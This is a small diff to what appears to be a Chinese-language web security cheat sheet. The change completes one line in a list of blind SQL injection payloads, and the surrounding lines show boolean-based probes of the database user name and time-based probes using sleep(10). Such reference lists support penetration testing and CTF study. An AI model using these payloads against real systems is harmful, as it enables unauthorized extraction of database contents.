@@ -893,7 +893,7 @@ pop graphic-context
         - `id=87 and length(user())>0`
         - `id=87 and length(user())>100`
         - `id=87 and ascii(mid(user(),1,1))>100`
-        - `id=87 or ((select user()) regexp binary
+        - `id=87 or ((select user()) regexp binary '^[a-z]')`
     - Time
         - 用在啥結果都看不到時
         - `id=87 and if(length(user())>0, sleep(10), 1)=1`
